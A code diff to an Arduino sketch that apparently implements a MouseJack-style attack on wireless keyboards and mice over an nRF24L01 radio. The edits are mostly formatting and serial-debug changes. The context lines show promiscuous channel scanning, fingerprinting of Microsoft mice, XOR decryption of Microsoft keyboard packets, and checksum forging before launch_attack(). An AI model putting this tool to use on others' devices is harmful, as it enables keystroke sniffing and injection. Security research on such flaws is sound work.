@@ -3,6 +3,7 @@
 #include "nRF24L01.h"
 #include "RF24.h"
 #include "attack.h"
+#include "printf.h"
 
 #define CE 5
 #define CSN 6
@@ -24,8 +25,7 @@ bool payload_encrypted = false;
 uint8_t payload_type = 0;
 uint16_t sequence;
 
-void print_payload_details()
-{
+void print_payload_details(){
   Serial.print("ch: ");
   Serial.print(channel);
   Serial.print(" s: ");
@@ -47,8 +47,7 @@ void print_payload_details()
 }
 
 // Update a CRC16-CCITT with 1-8 bits from a given byte
-uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
-{
+uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits){
   crc = crc ^ (byte << 8);
   while(bits--)
     if((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
@@ -57,8 +56,7 @@ uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
   return crc;
 }
 
-uint8_t writeRegister(uint8_t reg, uint8_t value)
-{
+uint8_t writeRegister(uint8_t reg, uint8_t value){
   uint8_t status;
 
   digitalWrite(CSN, LOW);
@@ -68,8 +66,7 @@ uint8_t writeRegister(uint8_t reg, uint8_t value)
   return status;
 }
 
-uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
-{
+uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len){
   uint8_t status;
 
   digitalWrite(CSN, LOW);
@@ -81,8 +78,7 @@ uint8_t writeRegister(uint8_t reg, const uint8_t* buf, uint8_t len)
   return status;
 }
 
-bool transmit()
-{
+bool transmit(){
   print_payload_details();
   radio.write(payload, payload_size);
   return true;
@@ -112,7 +108,7 @@ void scan() {
   radio.openReadingPipe(0, promisc_addr);
   radio.disableCRC();
   radio.startListening();
-  //radio.printDetails();
+  radio.printDetails();
 
   while (1) {
     channel++;
@@ -213,8 +209,7 @@ void scan() {
   }
 }
 
-void start_transmit()
-{
+void start_transmit(){
   radio.stopListening();
 
   radio.openWritingPipe(address);
@@ -232,15 +227,13 @@ void start_transmit()
 }
 
 // decrypt those keyboard packets!
-void ms_crypt()
-{
+void ms_crypt(){
   for (int i = 4; i < payload_size; i++)
     payload[i] ^= address >> (((i - 4) % 5) * 8) & 0xFF;
 }
 
 // calculate microsoft wireless keyboard checksum
-void ms_checksum()
-{
+void ms_checksum(){
   int last = payload_size - 1;
   payload[last] = 0;
   for (int i = 0; i < last; i++)
@@ -248,8 +241,7 @@ void ms_checksum()
   payload[last] = ~payload[last];
 }
 
-void fingerprint()
-{
+void fingerprint(){
   if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
     Serial.println("found MS mouse");
     payload_type = MICROSOFT;
@@ -458,7 +450,10 @@ void reset() {
 }
 
 void setup() {
-  Serial.begin(115200);
+  Serial.begin(9600);
+  while (!Serial) {
+  }
+  printf_begin();
   pinMode(ledpin, OUTPUT);
   digitalWrite(ledpin, LOW);
 }
@@ -468,4 +463,7 @@ void loop() {
   scan();
   fingerprint();
   launch_attack();
+  while(true){
+    //stop processing
+  }
 }
